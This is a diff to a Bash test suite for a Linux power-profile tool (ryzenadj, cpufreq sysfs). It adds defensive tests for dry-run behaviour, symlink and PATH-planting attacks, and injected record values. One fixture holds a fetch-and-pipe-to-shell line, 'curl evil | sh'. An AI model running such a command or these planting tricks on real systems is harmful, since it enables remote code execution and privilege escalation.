@@ -519,7 +519,8 @@ case_the_guardrail_bounds_and_the_unit_name_come_from_the_environment() {
     assert_contains "profile 'chilly'" "$out" 'lowering MIN_TEMP_C did not lower the guardrail'
 
     : > "$LOG"
-    LEGION_POWERCTL_SERVICE_NAME=other-name.service run_cli disable >/dev/null
+    local -a LEGION_TEST_ENV=(LEGION_POWERCTL_SERVICE_NAME=other-name.service)
+    run_cli disable >/dev/null
     assert_file_contains 'systemctl disable --now other-name.service' "$LOG" \
         'disable ignored LEGION_POWERCTL_SERVICE_NAME'
 }
@@ -572,9 +573,40 @@ case_the_read_only_subcommands_take_their_defaults_from_the_config() {
     assert_fails 'select accepted a profile that does not exist' run_cli select nonexistent
     assert_contains 'balanced-plus' "$(run_cli show)" 'show with no argument did not use the active profile'
     assert_fails 'delete removed the active profile without --force' run_cli delete balanced-plus
+    cp "$ROOT_DIR/profiles/balanced.conf" "$PROFILES/balanced.conf"
     run_cli delete balanced-plus --force >/dev/null
     [[ ! -e "$PROFILES/balanced-plus.conf" ]] || \
         assert_eq 'removed' 'still present' 'delete --force left the active profile in place'
+}
+
+case_forced_delete_of_the_boot_profile_moves_boot_to_balanced() {
+    cp "$ROOT_DIR/profiles/balanced.conf" "$PROFILES/balanced.conf"
+    local out
+    out="$(run_cli delete balanced-plus --force 2>&1)"
+    assert_contains "boot now uses 'balanced'" "$out" 'the forced delete did not say where boot went'
+    assert_file_contains 'ACTIVE_PROFILE=balanced' "$ETC/config.conf" \
+        'the forced delete left boot pointing at a deleted profile'
+    refute_contains 'balanced-plus' "$(<"$ETC/config.conf")" 'the boot pointer still names the deleted profile'
+    run_cli apply --boot >/dev/null 2>&1 || assert_eq 'boot apply passes' 'boot apply fails' \
+        'boot is stranded after the forced delete'
+}
+
+case_forced_delete_of_the_boot_profile_refuses_without_a_valid_balanced() {
+    local out rc=0
+    out="$(run_cli delete balanced-plus --force 2>&1)" || rc=$?
+    assert_eq '1' "$rc" 'the boot profile was deleted with no balanced to fall back to'
+    assert_contains "'balanced' is missing or invalid" "$out" 'the refusal did not say why'
+    [[ -e "$PROFILES/balanced-plus.conf" ]] || assert_eq 'kept' 'deleted' 'the refused delete still removed the profile'
+
+    printf 'STAPM_W=banana\n' > "$PROFILES/balanced.conf"
+    assert_fails 'an invalid balanced was accepted as the fallback' run_cli delete balanced-plus --force
+    assert_file_contains 'ACTIVE_PROFILE=balanced-plus' "$ETC/config.conf" 'a refused delete moved the boot pointer'
+
+    cp "$ROOT_DIR/profiles/balanced.conf" "$PROFILES/balanced.conf"
+    printf 'ACTIVE_PROFILE=balanced\n' > "$ETC/config.conf"
+    assert_fails 'balanced, the fallback itself, was force-deleted while it is the boot profile' \
+        run_cli delete balanced --force
+    [[ -e "$PROFILES/balanced.conf" ]] || assert_eq 'kept' 'deleted' 'balanced was deleted while it is the boot profile'
 }
 
 case_restore_frequency_honours_every_boost_value() {
@@ -1107,6 +1139,239 @@ case_smu_persistence_rejects_a_freshly_loaded_incompatible_driver() {
     }
 }
 
+plant_ryzenadj() {
+    local dir="$1" marker="$2"
+    mkdir -p "$dir"
+    printf '#!/bin/sh\nprintf "%%s\\n" "$*" >> %q\nprintf "Version: v9.9.9\\n"\n' "$marker" > "$dir/ryzenadj"
+    chmod 0755 "$dir/ryzenadj"
+}
+
+untested_env() {
+    local entry
+    for entry in "${FAKE_ENV[@]}"; do
+        [[ "$entry" == LEGION_POWERCTL_TESTING=* || "$entry" == LEGION_POWERCTL_*_BIN=* ]] || \
+            printf '%s\n' "$entry"
+    done
+}
+
+case_doctor_and_status_never_run_a_ryzenadj_planted_on_path() {
+    if (( EUID == 0 )); then
+        printf '  (skipped: running as root)\n'
+        return 0
+    fi
+    local marker="$FAKE_ROOT/planted.log" out
+    local -a production_env=()
+    mapfile -t production_env < <(untested_env)
+    plant_ryzenadj "$FAKE_ROOT/planted" "$marker"
+    out="$(env "${production_env[@]}" PATH="$FAKE_ROOT/planted:$PATH" \
+        "$FAKE_CLI" doctor 2>&1 || true)"
+    refute_contains "$FAKE_ROOT/planted" "$out" 'doctor chose a ryzenadj from PATH'
+    out="$(env "${production_env[@]}" PATH="$FAKE_ROOT/planted:$PATH" \
+        "$FAKE_CLI" status --json 2>&1 || true)"
+    refute_contains "$FAKE_ROOT/planted" "$out" 'status --json chose a ryzenadj from PATH'
+    env "${production_env[@]}" LEGION_POWERCTL_RYZENADJ_BIN="$FAKE_ROOT/planted/ryzenadj" \
+        "$FAKE_CLI" doctor >/dev/null 2>&1 || true
+    env "${production_env[@]}" LEGION_POWERCTL_RYZENADJ_BIN="$FAKE_ROOT/planted/ryzenadj" \
+        "$FAKE_CLI" status >/dev/null 2>&1 || true
+    [[ ! -e "$marker" ]] || {
+        printf 'FAIL: doctor or status executed a planted ryzenadj without TESTING:\n%s\n' "$(<"$marker")" >&2
+        exit 1
+    }
+
+    out="$(PATH="$FAKE_ROOT/planted:$PATH" LEGION_TEST_RYZENADJ_BIN='' run_cli doctor 2>&1 || true)"
+    assert_contains "$FAKE_ROOT/planted/ryzenadj" "$out" 'TESTING no longer reaches the fake ryzenadj on PATH'
+}
+
+case_root_ignores_testing_and_every_test_override() {
+    if ! unshare --map-root-user true >/dev/null 2>&1; then
+        printf '  (skipped: no unprivileged user namespace to become root in)\n'
+        return 0
+    fi
+    local marker="$FAKE_ROOT/planted.log" out
+    plant_ryzenadj "$FAKE_ROOT/planted" "$marker"
+    out="$(unshare --map-root-user env "${FAKE_ENV[@]}" \
+        LEGION_POWERCTL_RYZENADJ_BIN="$FAKE_ROOT/planted/ryzenadj" \
+        PATH="$FAKE_ROOT/planted:$PATH" "$FAKE_CLI" doctor 2>&1 || true)"
+    refute_contains "$FAKE_ROOT" "$out" 'root honoured a test path or binary override'
+    [[ ! -e "$marker" ]] || {
+        printf 'FAIL: root executed the ryzenadj named by a test override\n' >&2
+        exit 1
+    }
+}
+
+fake_tree_digest() {
+    (cd "$FAKE_ROOT" && find etc run var sys -type f -print0 | sort -z | xargs -0 md5sum)
+}
+
+case_dry_run_refuses_every_mutation_it_cannot_preview() {
+    cp "$ROOT_DIR/profiles/balanced.conf" "$PROFILES/balanced.conf"
+    local before command out rc
+    local -a argv
+    mkdir -p "$LIB"
+    before="$(fake_tree_digest)"
+    : > "$LOG"
+    for command in "configure quiet --stapm 40 --slow 45 --fast 50 --select --apply" \
+                   "configure fresh --select" "select quiet --apply" "select quiet" \
+                   "delete quiet" "delete balanced-plus --force" "enable --force" "enable" \
+                   "disable" "baseline --capture" "wizard quiet"; do
+        read -r -a argv <<<"$command"
+        rc=0
+        out="$(LEGION_POWERCTL_DRY_RUN=1 run_cli "${argv[@]}" 2>&1)" || rc=$?
+        assert_eq '1' "$rc" "'$command' did not refuse under LEGION_POWERCTL_DRY_RUN=1"
+        assert_contains 'has no dry run' "$out" "'$command' refused without saying why"
+    done
+    assert_eq '' "$(<"$LOG")" 'a refused dry-run command still ran a helper'
+    assert_eq "$before" "$(fake_tree_digest)" \
+        'a refused dry-run command still changed a file'
+
+    for command in "apply quiet" "restore-frequency" "repair balanced-plus"; do
+        read -r -a argv <<<"$command"
+        out="$(LEGION_POWERCTL_DRY_RUN=1 run_cli "${argv[@]}" 2>&1)"
+        assert_contains 'DRY RUN' "$out" "'$command' did not preview under LEGION_POWERCTL_DRY_RUN=1"
+    done
+    assert_eq '' "$(<"$LOG")" 'a previewed command ran a helper'
+    assert_eq "$before" "$(fake_tree_digest)" \
+        'a previewed command changed a file'
+}
+
+case_no_writer_follows_a_planted_symlink() {
+    local victim="$FAKE_ROOT/victim" out rc
+    printf 'victim\n' > "$victim"
+    chmod 0600 "$victim"
+
+    rm -f "$STATE/last-apply.env"
+    ln -s "$victim" "$STATE/last-apply.env"
+    assert_fails 'apply wrote its record through a symlink' run_cli apply quiet
+    assert_eq 'victim' "$(<"$victim")" 'the apply record was written through a symlink'
+    rm -f "$STATE/last-apply.env"
+
+    mkdir -p "$LIB"
+    : > "$FAKE_ROOT/empty-victim"
+    chmod 0600 "$FAKE_ROOT/empty-victim"
+    ln -s "$FAKE_ROOT/empty-victim" "$LIB/stock-limits.env"
+    run_cli apply quiet >/dev/null 2>&1
+    assert_eq '' "$(<"$FAKE_ROOT/empty-victim")" 'the baseline was written through a symlink'
+    assert_eq '600' "$(stat -c %a "$FAKE_ROOT/empty-victim")" 'the baseline chmod went through a symlink'
+    rm -f "$LIB/stock-limits.env"
+
+    mv "$ETC/config.conf" "$FAKE_ROOT/config.real"
+    ln -s "$victim" "$ETC/config.conf"
+    assert_fails 'select wrote config.conf through a symlink' run_cli select quiet
+    assert_eq 'victim' "$(<"$victim")" 'config.conf was written through a symlink'
+    rm -f "$ETC/config.conf"
+    mv "$FAKE_ROOT/config.real" "$ETC/config.conf"
+
+    ln -s "$FAKE_ROOT/no-such-target" "$PROFILES/fresh.conf"
+    assert_fails 'configure wrote a profile through a symlink' \
+        run_cli configure fresh --stapm 40 --slow 45 --fast 50
+    [[ ! -e "$FAKE_ROOT/no-such-target" ]] || assert_eq 'absent' 'created' 'a profile was written through a symlink'
+    rm -f "$PROFILES/fresh.conf"
+
+    local control
+    for control in scaling_min_freq scaling_max_freq energy_performance_preference; do
+        cp -p "$SYSFS/cpufreq/policy0/$control" "$FAKE_ROOT/$control.saved"
+        rm -f "$SYSFS/cpufreq/policy0/$control"
+        ln -s "$victim" "$SYSFS/cpufreq/policy0/$control"
+        rc=0
+        out="$(run_cli restore-frequency 2>&1 && run_cli apply balanced-plus 2>&1)" || rc=$?
+        assert_eq '1' "$rc" "a symlinked $control was accepted"
+        assert_contains 'symlink' "$out" "the refusal to write $control did not say why"
+        assert_eq 'victim' "$(<"$victim")" "$control was written through a symlink"
+        rm -f "$SYSFS/cpufreq/policy0/$control"
+        cp -p "$FAKE_ROOT/$control.saved" "$SYSFS/cpufreq/policy0/$control"
+    done
+
+    rm -f "$SYSFS/cpufreq/boost"
+    ln -s "$victim" "$SYSFS/cpufreq/boost"
+    out="$(run_cli restore-frequency --boost on 2>&1)"
+    assert_contains 'rejected writing BOOST' "$out" 'a symlinked boost control was not refused'
+    assert_eq 'victim' "$(<"$victim")" 'boost was written through a symlink'
+}
+
+case_persistent_writes_replace_files_rather_than_truncating_them() {
+    local file
+    local -a files=("$STATE/last-apply.env" "$ETC/config.conf" "$PROFILES/quiet.conf")
+    for file in "${files[@]}"; do
+        ln "$file" "$file.hardlink"
+        cp "$file" "$file.before"
+    done
+    run_cli configure quiet --stapm 41 --slow 46 --fast 51 --select --apply >/dev/null
+    for file in "${files[@]}"; do
+        cmp -s "$file.before" "$file.hardlink" || {
+            printf 'FAIL: %s was rewritten in place, so a crash could leave it truncated\n' "$file" >&2
+            exit 1
+        }
+        ! cmp -s "$file.before" "$file" || assert_eq 'rewritten' 'unchanged' "$file was not rewritten"
+        [[ ! -L "$file" && -f "$file" ]] || assert_eq 'regular file' 'other' "$file is no longer a regular file"
+        assert_eq '644' "$(stat -c %a "$file")" "$file lost its readable mode"
+    done
+    assert_file_contains 'STAPM_W=41' "$STATE/last-apply.env" 'the record does not show the new apply'
+    assert_eq '' "$(find "$ETC" "$STATE" -name '.*' -type f)" 'a temporary file was left behind'
+}
+
+case_a_symlinked_profile_or_config_is_refused_everywhere() {
+    ln -s quiet.conf "$PROFILES/alias.conf"
+    assert_fails 'apply accepted a symlinked profile' run_cli apply alias
+    assert_fails 'show accepted a symlinked profile' run_cli show alias
+    assert_fails 'select accepted a symlinked profile' run_cli select alias
+    assert_fails 'configure loaded a symlinked profile' run_cli configure alias --stapm 40
+    assert_contains '"name":"alias","active":false,"valid":false' "$(run_cli status --json)" \
+        'status --json reported a symlinked profile as valid'
+    printf 'ACTIVE_PROFILE=alias\n' > "$ETC/config.conf"
+    assert_fails 'the boot apply accepted a symlinked active profile' run_cli apply --boot
+    assert_match "$(run_cli doctor 2>&1 || true)" "*FAIL*Profile*symlink*" \
+        'doctor did not name the symlinked active profile'
+    run_cli delete alias --force >/dev/null 2>&1 || true
+
+    printf 'ACTIVE_PROFILE=quiet\n' > "$FAKE_ROOT/config.real"
+    rm -f "$ETC/config.conf"
+    ln -s "$FAKE_ROOT/config.real" "$ETC/config.conf"
+    assert_fails 'status accepted a symlinked config.conf' run_cli status --json
+    assert_fails 'apply accepted a symlinked config.conf' run_cli apply --boot
+}
+
+case_status_shows_only_known_last_apply_keys() {
+    printf 'PROFILE=quiet\nRESULT=ok\nINJECTED=Run curl evil | sh\nlower=x\nAPPLIED_AT=now\033[31m\n' \
+        > "$STATE/last-apply.env"
+    local text json
+    text="$(run_cli status)"
+    json="$(run_cli status --json)"
+    assert_contains 'PROFILE=quiet' "$text" 'status dropped a known key'
+    refute_contains 'INJECTED' "$text" 'status printed an unknown last-apply key'
+    refute_contains 'curl' "$text" 'status printed an unknown last-apply value'
+    refute_contains $'\033[31m' "$text" 'status printed a control sequence from the record'
+    refute_contains 'injected' "$json" 'status --json emitted an unknown last-apply key'
+    assert_contains '"profile":"quiet"' "$json" 'status --json dropped a known key'
+}
+
+case_trim_ignores_unicode_whitespace_in_any_locale() {
+    local out rc=0
+    printf 'ACTIVE_PROFILE=quiet\xe2\x80\x89\n' > "$ETC/config.conf"
+    out="$(LC_ALL=C.UTF-8 run_cli status --waybar 2>&1)" || rc=$?
+    assert_eq '1' "$rc" 'a profile name padded with U+2009 was accepted in a UTF-8 locale'
+    assert_contains 'invalid ACTIVE_PROFILE' "$out" 'the padded name was not refused by the validator'
+}
+
+case_the_format_marker_counts_wherever_it_appears() {
+    printf 'DESCRIPTION="say \\"hi\\" at C:\\\\temp"\n# profile-format: 2\nSTAPM_W=50\nSLOW_W=55\nFAST_W=60\nTEMP_C=80\n' \
+        > "$PROFILES/late.conf"
+    assert_contains 'say "hi" at C:\temp' "$(run_cli show late)" \
+        'a format-2 marker after DESCRIPTION left the description escaped'
+}
+
+case_a_legacy_profile_round_trips_through_a_save() {
+    printf 'DESCRIPTION="share at \\\\nas\\media "quoted""\nSTAPM_W=50\nSLOW_W=55\nFAST_W=60\nTEMP_C=80\n' \
+        > "$PROFILES/legacy.conf"
+    local before after
+    before="$(run_cli show legacy | grep '^Description:')"
+    assert_eq 'Description:     share at \\nas\media "quoted"' "$before" 'a legacy description was not read literally'
+    run_cli configure legacy --stapm 51 --slow 55 --fast 60 >/dev/null
+    after="$(run_cli show legacy | grep '^Description:')"
+    assert_eq "$before" "$after" 'saving a legacy profile changed its description'
+    run_cli configure legacy --stapm 52 --slow 55 --fast 60 >/dev/null
+    assert_eq "$before" "$(run_cli show legacy | grep '^Description:')" 'a second save changed the description again'
+}
+
 run_case case_config_rejects_malformed_and_unknown_and_traversing_values \
     'a malformed, unknown or traversing config value is refused'
 run_case case_the_boot_service_argv_applies_the_active_profile \
@@ -1173,6 +1438,10 @@ run_case case_the_privileged_subcommands_refuse_to_run_unprivileged \
     'the privileged subcommands refuse to run unprivileged'
 run_case case_the_read_only_subcommands_take_their_defaults_from_the_config \
     'select, show and delete take their defaults from the config'
+run_case case_forced_delete_of_the_boot_profile_moves_boot_to_balanced \
+    'a forced delete of the boot profile moves boot to balanced'
+run_case case_forced_delete_of_the_boot_profile_refuses_without_a_valid_balanced \
+    'a forced delete of the boot profile refuses without a valid balanced'
 run_case case_restore_frequency_honours_every_boost_value \
     'restore-frequency honours every boost value'
 run_case case_restore_frequency_dry_run_preserves_controls \
@@ -1227,6 +1496,27 @@ run_case case_balanced_plus_can_repair_an_existing_high_ceiling \
     'balanced-plus can correct and apply an existing high ceiling at 82 C'
 run_case case_other_profiles_keep_their_temperature_range \
     'other profiles can save and apply 85 C and 90 C ceilings'
+
+run_case case_doctor_and_status_never_run_a_ryzenadj_planted_on_path \
+    'doctor and status never run a ryzenadj planted on PATH without TESTING'
+run_case case_root_ignores_testing_and_every_test_override \
+    'root ignores TESTING and every test override'
+run_case case_dry_run_refuses_every_mutation_it_cannot_preview \
+    'LEGION_POWERCTL_DRY_RUN=1 previews or refuses every mutating command'
+run_case case_no_writer_follows_a_planted_symlink \
+    'no writer follows a planted symlink'
+run_case case_persistent_writes_replace_files_rather_than_truncating_them \
+    'persistent writes replace files rather than truncating them'
+run_case case_a_symlinked_profile_or_config_is_refused_everywhere \
+    'a symlinked profile or config.conf is refused everywhere'
+run_case case_status_shows_only_known_last_apply_keys \
+    'status shows only known last-apply keys'
+run_case case_trim_ignores_unicode_whitespace_in_any_locale \
+    'trim ignores Unicode whitespace in any locale'
+run_case case_the_format_marker_counts_wherever_it_appears \
+    'the profile-format marker counts wherever it appears'
+run_case case_a_legacy_profile_round_trips_through_a_save \
+    'a legacy profile round-trips through a save'
 
 registered="$CASE_NUMBER"
 defined="$(declare -F | sed -n 's/^declare -f \(case_.*\)$/\1/p' | wc -l)"
